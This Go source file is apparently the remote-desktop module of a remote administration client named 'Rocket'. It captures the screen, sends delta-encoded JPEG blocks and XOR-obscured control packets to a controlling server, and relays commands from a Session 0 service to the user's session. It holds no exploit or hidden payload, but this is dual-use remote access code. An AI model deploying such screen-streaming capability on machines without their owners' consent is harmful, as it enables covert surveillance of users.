package desktop

import (
	"Rocket/client/common"
	"Rocket/client/ipc"
	"Rocket/client/telemetry"
	"Rocket/modules"
	"Rocket/utils"
	"Rocket/utils/cmap"
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"github.com/kbinani/screenshot"
	"image"
	"image/jpeg"
	"reflect"
	"runtime"
	"sync"
	"time"
	"unsafe"
)

type session struct {
	lastPack int64
	rawEvent []byte
	event    string
	escape   bool
	channel  chan message
	lock     *sync.Mutex
	rtc      *rtcSession
}
type message struct {
	t     int
	info  string
	frame *[]*[]byte
}

// frame packet format:
// +---------+---------+----------+-------------+----------+---------+---------+---------+---------+-------+
// | magic   | op code | event id | body length | img type | x       | y       | width   | height  | image |
// +---------+---------+----------+-------------+----------+---------+---------+---------+---------+-------+
// | 5 bytes | 1 byte  | 16 bytes | 2 bytes     | 2 bytes  | 2 bytes | 2 bytes | 2 bytes | 2 bytes | -     |
// +---------+---------+----------+-------------+----------+---------+---------+---------+---------+-------+

// magic:
// []byte{34, 22, 19, 17, 20}

// op code:
// 00: first part of a frame, device -> browser
// 01: rest parts of a frame, device -> browser
// 02: set resolution of every frame, device -> browser
// 03: JSON string, server -> browser

// img type:
// 0: raw image
// 1: compressed image (jpeg)

// Frame protocol constants
const (
	compressRaw  = 0 // Raw RGBA image
	compressJPEG = 1 // JPEG compressed image
)

// Screen capture settings
const (
	fpsLimit     = 24 // Maximum frames per second
	blockSize    = 96 // Pixel block size for delta encoding
	frameBuffer  = 3  // Max queued frames before dropping
	displayIndex = 0  // Primary display index
	imageQuality = 70 // JPEG quality (0-100)
)

// Magic bytes for binary protocol
var magicBytes = []byte{34, 22, 19, 17, 20}

// Op codes for frame protocol
const (
	opFirstFrame = 0x00 // First part of a frame
	opRestFrame  = 0x01 // Rest parts of a frame
	opResolution = 0x02 // Resolution info
	opJSON       = 0x03 // JSON data
)

const compress = compressJPEG

var lock = &sync.Mutex{}
var working = false
var sessions = cmap.New[*session]()
var prevDesktop *image.RGBA
var displayBounds image.Rectangle
var errNoImage = errors.New(`DESKTOP.NO_IMAGE_YET`)
var errNoActiveSession = errors.New(`DESKTOP.NO_ACTIVE_SESSION`)

// sendDesktopData writes desktop binary data either to the WebSocket (Session 0) or over IPC (user session bridge).
func sendDesktopData(buf []byte) {
	if common.WSConn != nil {
		if err := common.WSConn.SendData(buf); err != nil {
			telemetry.LogStructured("ERROR", "desktop: failed to send frame over WS", map[string]interface{}{
				"error": err.Error(),
			})
		}
		return
	}
	if ok := SendFrameViaIPC(buf); !ok {
		telemetry.LogStructured("WARN", "desktop: IPC frame send failed", map[string]interface{}{
			"bridge_mode": IsBridgeMode(),
		})
	}
}

// sendDesktopPacket delivers a control packet back to the server (via WS) or to Session 0 over IPC.
func sendDesktopPacket(pack modules.Packet, rawEvent []byte) {
	if pack.Event == `` && rawEvent != nil {
		pack.Event = hex.EncodeToString(rawEvent)
	}

	if common.WSConn != nil {
		// For init acknowledgements, use the standard encrypted pack pathway.
		if pack.Act == "DESKTOP_INIT" {
			if err := common.WSConn.SendPack(pack); err != nil {
				telemetry.LogStructured("ERROR", "desktop: failed to send init callback", map[string]interface{}{
					"error": err.Error(),
				})
			}
			return
		}

		// Ensure we have raw event bytes; decode from pack if not provided.
		if rawEvent == nil && len(pack.Event) > 0 {
			if ev, err := hex.DecodeString(pack.Event); err == nil {
				rawEvent = ev
			} else {
				telemetry.LogStructured("WARN", "desktop: failed to decode event hex", map[string]interface{}{
					"act":   pack.Act,
					"event": pack.Event,
					"error": err.Error(),
				})
			}
		}

		data, err := utils.JSON.Marshal(pack)
		if err != nil {
			return
		}
		// If we still don't have raw event bytes, fall back to SendPack so callbacks still reach the server.
		if rawEvent == nil {
			if err := common.WSConn.SendPack(pack); err != nil {
				telemetry.LogStructured("ERROR", "desktop: failed to send control pack fallback", map[string]interface{}{
					"act":   pack.Act,
					"error": err.Error(),
				})
			}
			return
		}

		data = utils.XOR(data, common.WSConn.GetSecret())
		if err := common.WSConn.SendRawData(rawEvent, data, 20, opJSON); err != nil {
			telemetry.LogStructured("ERROR", "desktop: failed to send control packet", map[string]interface{}{
				"act":   pack.Act,
				"error": err.Error(),
			})
		}
		return
	}

	// Bridge mode: forward to Session 0 for delivery.
	if ok := SendPacketViaIPC(pack); !ok {
		telemetry.LogStructured("WARN", "desktop: IPC control send failed", map[string]interface{}{
			"act":         pack.Act,
			"bridge_mode": IsBridgeMode(),
		})
	}
}

// relayDesktopCommand forwards desktop commands from Session 0 to the active user session.
// Returns (true, nil) when forwarded, (true, err) when relay failed, (false, nil) when not in Session 0 mode.
func relayDesktopCommand(pack modules.Packet, msgType uint16) (bool, error) {
	if !IsSession0Mode() {
		return false, nil
	}

	sessionID := GetActiveSessionID()
	if sessionID == 0 {
		return true, errNoActiveSession
	}

	relay := GetOrCreateRelay(sessionID)
	if err := relay.Connect(); err != nil {
		return true, err
	}

	switch msgType {
	case ipc.MsgTypeDesktopInit:
		return true, relay.SendInit(pack)
	case ipc.MsgTypeDesktopKill:
		return true, relay.SendKill(pack)
	case ipc.MsgTypeDesktopPing:
		return true, relay.SendPing(pack)
	case ipc.MsgTypeDesktopInput:
		return true, relay.SendInput(pack)
	case ipc.MsgTypeDesktopConfig:
		return true, relay.SendConfig(pack)
	case ipc.MsgTypeDesktopShot:
		return true, relay.SendShot(pack)
	default:
		return true, errors.New("unsupported relay message type")
	}
}

func init() {
	go healthCheck()
}

func worker() {
	runtime.LockOSThread()
	lock.Lock()
	if working {
		lock.Unlock()
		runtime.UnlockOSThread()
		return
	}
	working = true
	lock.Unlock()

	var (
		numErrors int
		screen    Screen
		img       *image.RGBA
		err       error
	)
	screen.Init(displayIndex, displayBounds)
	for working {
		if sessions.Count() == 0 {
			break
		}
		img, err = screen.Capture()
		if err != nil {
			if err == errNoImage {
				<-time.After(time.Second / fpsLimit)
				continue
			}
			numErrors++
			if numErrors > 10 {
				break
			}
		} else {
			numErrors = 0
			diff := imageCompare(img, prevDesktop, compress)
			if diff != nil && len(diff) > 0 {
				prevDesktop = img
				sendImageDiff(diff)
			}
			broadcastRTC(img, time.Second/fpsLimit)
			<-time.After(time.Second / fpsLimit)
		}
	}
	img = nil
	prevDesktop = nil
	if numErrors > 10 {
		quitAllDesktop(err.Error())
	}
	lock.Lock()
	working = false
	lock.Unlock()
	screen.Release()
	runtime.UnlockOSThread()
	go runtime.GC()
}

func sendImageDiff(diff []*[]byte) {
	sessions.IterCb(func(uuid string, desktop *session) bool {
		desktop.lock.Lock()
		if !desktop.escape {
			if len(desktop.channel) >= frameBuffer {
				select {
				case <-desktop.channel:
				default:
				}
			}
			desktop.channel <- message{t: 0, frame: &diff}
		}
		desktop.lock.Unlock()
		return true
	})
}

func quitAllDesktop(info string) {
	keys := make([]string, 0)
	sessions.IterCb(func(uuid string, desktop *session) bool {
		keys = append(keys, uuid)
		desktop.escape = true
		if desktop.rtc != nil {
			desktop.rtc.close()
			desktop.rtc = nil
		}
		desktop.channel <- message{t: 1, info: info}
		return true
	})
	sessions.Clear()
	lock.Lock()
	working = false
	lock.Unlock()
}

func imageCompare(img, prev *image.RGBA, compress int) []*[]byte {
	result := make([]*[]byte, 0)
	if prev == nil {
		return splitFullImage(img, compress)
	}
	diff := getDiff(img, prev)
	if diff == nil {
		return result
	}
	for _, rect := range diff {
		block := getImageBlock(img, rect, compress)
		block = makeImageBlock(block, rect, compress)
		result = append(result, &block)
	}
	return result
}

func splitFullImage(img *image.RGBA, compress int) []*[]byte {
	if img == nil {
		return nil
	}
	result := make([]*[]byte, 0)
	rect := img.Rect
	imgWidth := rect.Dx()
	imgHeight := rect.Dy()
	for y := rect.Min.Y; y < rect.Max.Y; y += blockSize {
		height := utils.If(y+blockSize > imgHeight, imgHeight-y, blockSize)
		for x := rect.Min.X; x < rect.Max.X; x += blockSize {
			width := utils.If(x+blockSize > imgWidth, imgWidth-x, blockSize)
			blockRect := image.Rect(x, y, x+width, y+height)
			block := getImageBlock(img, blockRect, compress)
			block = makeImageBlock(block, blockRect, compress)
			result = append(result, &block)
		}
	}
	return result
}

func getImageBlock(img *image.RGBA, rect image.Rectangle, compress int) []byte {
	width := rect.Dx()
	height := rect.Dy()
	buf := make([]byte, width*height*4)
	bufPos := 0
	imgPos := img.PixOffset(rect.Min.X, rect.Min.Y)
	for y := 0; y < height; y++ {
		copy(buf[bufPos:bufPos+width*4], img.Pix[imgPos:imgPos+width*4])
		bufPos += width * 4
		imgPos += img.Stride
	}
	switch compress {
	case 0:
		return buf
	case 1:
		subImg := &image.RGBA{
			Pix:    buf,
			Stride: width * 4,
			Rect:   image.Rect(0, 0, width, height),
		}
		writer := &bytes.Buffer{}
		jpeg.Encode(writer, subImg, &jpeg.Options{Quality: imageQuality})
		return writer.Bytes()
	}
	return nil
}

func makeImageBlock(block []byte, rect image.Rectangle, compress int) []byte {
	buf := make([]byte, 12)
	binary.BigEndian.PutUint16(buf[0:2], uint16(len(block)+10))
	binary.BigEndian.PutUint16(buf[2:4], uint16(compress))
	binary.BigEndian.PutUint16(buf[4:6], uint16(rect.Min.X))
	binary.BigEndian.PutUint16(buf[6:8], uint16(rect.Min.Y))
	binary.BigEndian.PutUint16(buf[8:10], uint16(rect.Size().X))
	binary.BigEndian.PutUint16(buf[10:12], uint16(rect.Size().Y))
	buf = append(buf, block...)
	return buf
}

func getDiff(img, prev *image.RGBA) []image.Rectangle {
	imgWidth := img.Rect.Dx()
	imgHeight := img.Rect.Dy()
	result := make([]image.Rectangle, 0)
	for y := 0; y < imgHeight; y += blockSize * 2 {
		height := utils.If(y+blockSize > imgHeight, imgHeight-y, blockSize)
		for x := 0; x < imgWidth; x += blockSize {
			width := utils.If(x+blockSize > imgWidth, imgWidth-x, blockSize)
			rect := image.Rect(x, y, x+width, y+height)
			if isDiff(img, prev, rect) {
				result = append(result, rect)
			}
		}
	}
	for y := blockSize; y < imgHeight; y += blockSize * 2 {
		height := utils.If(y+blockSize > imgHeight, imgHeight-y, blockSize)
		for x := 0; x < imgWidth; x += blockSize {
			width := utils.If(x+blockSize > imgWidth, imgWidth-x, blockSize)
			rect := image.Rect(x, y, x+width, y+height)
			if isDiff(img, prev, rect) {
				result = append(result, rect)
			}
		}
	}
	return result
}

func isDiff(img, prev *image.RGBA, rect image.Rectangle) bool {
	imgHeader := (*reflect.SliceHeader)(unsafe.Pointer(&img.Pix))
	prevHeader := (*reflect.SliceHeader)(unsafe.Pointer(&prev.Pix))
	imgPtr := imgHeader.Data
	prevPtr := prevHeader.Data
	imgWidth := img.Rect.Dx()
	rectWidth := rect.Dx()

	end := 0
	if rect.Max.Y == 0 {
		end = rect.Max.X * 4
	} else {
		end = (rect.Max.Y*imgWidth - imgWidth + rect.Max.X) * 4
	}
	if imgHeader.Len < end || prevHeader.Len < end {
		return true
	}
	for y := rect.Min.Y; y < rect.Max.Y; y += 2 {
		cursor := uintptr((y*imgWidth + rect.Min.X) * 4)
		for x := 0; x < rectWidth; x += 4 {
			if *(*uint64)(unsafe.Pointer(imgPtr + cursor)) != *(*uint64)(unsafe.Pointer(prevPtr + cursor)) {
				return true
			}
			cursor += 16
		}
	}
	return false
}

func InitDesktop(pack modules.Packet) error {
	if forwarded, err := relayDesktopCommand(pack, ipc.MsgTypeDesktopInit); forwarded {
		return err
	}

	var uuid string
	rawEvent, err := hex.DecodeString(pack.Event)
	if err != nil {
		return err
	}
	if val, ok := pack.GetData(`desktop`, reflect.String); !ok {
		return errors.New(`${i18n|COMMON.INVALID_PARAMETER}`)
	} else {
		uuid = val.(string)
	}
	desktop := &session{
		event:    pack.Event,
		rawEvent: rawEvent,
		lastPack: utils.Unix,
		escape:   false,
		channel:  make(chan message, 5),
		lock:     &sync.Mutex{},
	}
	{
		displayBounds = screenshot.GetDisplayBounds(displayIndex)
		if screenshot.NumActiveDisplays() == 0 {
			if displayBounds.Dx() == 0 || displayBounds.Dy() == 0 {
				close(desktop.channel)
				sendDesktopPacket(modules.Packet{Act: `DESKTOP_QUIT`, Msg: `${i18n|DESKTOP.NO_DISPLAY_FOUND}`, Event: pack.Event}, desktop.rawEvent)
				return errors.New(`${i18n|DESKTOP.NO_DISPLAY_FOUND}`)
			}
		}
		desktop.channel <- message{t: 2}
	}
	go handleDesktop(pack, uuid, desktop)
	if !working {
		sessions.Set(uuid, desktop)
		go worker()
	} else {
		img := splitFullImage(prevDesktop, compress)
		desktop.lock.Lock()
		desktop.channel <- message{t: 0, frame: &img}
		desktop.lock.Unlock()
		sessions.Set(uuid, desktop)
	}
	return nil
}

func PingDesktop(pack modules.Packet) {
	if forwarded, _ := relayDesktopCommand(pack, ipc.MsgTypeDesktopPing); forwarded {
		return
	}

	var uuid string
	var desktop *session
	if val, ok := pack.GetData(`desktop`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
	}
	desktop, ok := sessions.Get(uuid)
	if !ok {
		return
	}
	desktop.lastPack = utils.Unix
}

func KillDesktop(pack modules.Packet) {
	if forwarded, _ := relayDesktopCommand(pack, ipc.MsgTypeDesktopKill); forwarded {
		return
	}

	var uuid string
	if val, ok := pack.GetData(`desktop`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
	}
	desktop, ok := sessions.Get(uuid)
	if !ok {
		return
	}
	sessions.Remove(uuid)

	desktop.lock.Lock()
	// Close RTC session if exists
	if desktop.rtc != nil {
		desktop.rtc.close()
		desktop.rtc = nil
	}
	desktop.escape = true
	rawEvent := desktop.rawEvent
	desktop.rawEvent = nil
	// Close channel to unblock handleDesktop goroutine
	if desktop.channel != nil {
		close(desktop.channel)
		desktop.channel = nil
	}
	desktop.lock.Unlock()

	// Send quit message
	if rawEvent != nil {
		sendDesktopPacket(modules.Packet{Act: `DESKTOP_QUIT`, Msg: `${i18n|DESKTOP.SESSION_CLOSED}`, Event: pack.Event}, rawEvent)
	}
}

func GetDesktop(pack modules.Packet) {
	if forwarded, _ := relayDesktopCommand(pack, ipc.MsgTypeDesktopShot); forwarded {
		return
	}

	var uuid string
	var desktop *session
	if val, ok := pack.GetData(`desktop`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
	}
	desktop, ok := sessions.Get(uuid)
	if !ok {
		return
	}
	if !desktop.escape {
		lock.Lock()
		img := splitFullImage(prevDesktop, compress)
		lock.Unlock()
		desktop.lock.Lock()
		desktop.channel <- message{t: 0, frame: &img}
		desktop.lock.Unlock()
	}
}

func handleDesktop(pack modules.Packet, uuid string, desktop *session) {
	defer func() {
		// Cleanup on exit
		desktop.lock.Lock()
		if desktop.rtc != nil {
			desktop.rtc.close()
			desktop.rtc = nil
		}
		desktop.lock.Unlock()
		sessions.Remove(uuid)
	}()

	for !desktop.escape {
		select {
		case msg, ok := <-desktop.channel:
			// Channel closed or error message
			if !ok {
				// Channel was closed by KillDesktop
				return
			}
			// Send error info
			if msg.t == 1 {
				desktop.lock.Lock()
				rawEvent := desktop.rawEvent
				event := desktop.event
				desktop.lock.Unlock()
				if rawEvent != nil {
					sendDesktopPacket(modules.Packet{Act: `DESKTOP_QUIT`, Msg: msg.info, Event: event}, rawEvent)
				}
				desktop.escape = true
				return
			}
			// send image
			if msg.t == 0 {
				buf := append(append(magicBytes, opFirstFrame), desktop.rawEvent...)
				for _, slice := range *msg.frame {
					if len(buf)+len(*slice) >= common.MaxMessageSize {
						sendDesktopData(buf)
						buf = append(append(magicBytes, opRestFrame), desktop.rawEvent...)
					}
					buf = append(buf, *slice...)
				}
				sendDesktopData(buf)
				buf = nil
				continue
			}
			// set resolution
			if msg.t == 2 {
				buf := append(append(magicBytes, opResolution), desktop.rawEvent...)
				data := make([]byte, 6)
				binary.BigEndian.PutUint16(data[:2], 4)
				binary.BigEndian.PutUint16(data[2:4], uint16(displayBounds.Dx()))
				binary.BigEndian.PutUint16(data[4:6], uint16(displayBounds.Dy()))
				buf = append(buf, data...)
				sendDesktopData(buf)
				continue
			}
		case <-time.After(7 * time.Second):
			continue
		}
	}
}

func healthCheck() {
	const MaxInterval = 30
	for now := range time.NewTicker(30 * time.Second).C {
		timestamp := now.Unix()
		// stores sessions to be disconnected
		keys := make([]string, 0)
		sessions.IterCb(func(uuid string, desktop *session) bool {
			if timestamp-desktop.lastPack > MaxInterval {
				if desktop.rtc != nil {
					desktop.rtc.close()
					desktop.rtc = nil
				}
				keys = append(keys, uuid)
			}
			return true
		})
		sessions.Remove(keys...)
	}
}

func broadcastRTC(img *image.RGBA, interval time.Duration) {
	if img == nil {
		return
	}
	sessions.IterCb(func(_ string, desktop *session) bool {
		if desktop == nil {
			return true
		}
		desktop.lock.Lock()
		rtc := desktop.rtc
		desktop.lock.Unlock()
		if rtc == nil {
			return true
		}
		if err := rtc.sendFrame(img, interval); err != nil {
			desktop.lock.Lock()
			rtc.close()
			desktop.rtc = nil
			desktop.lock.Unlock()
		}
		return true
	})
}
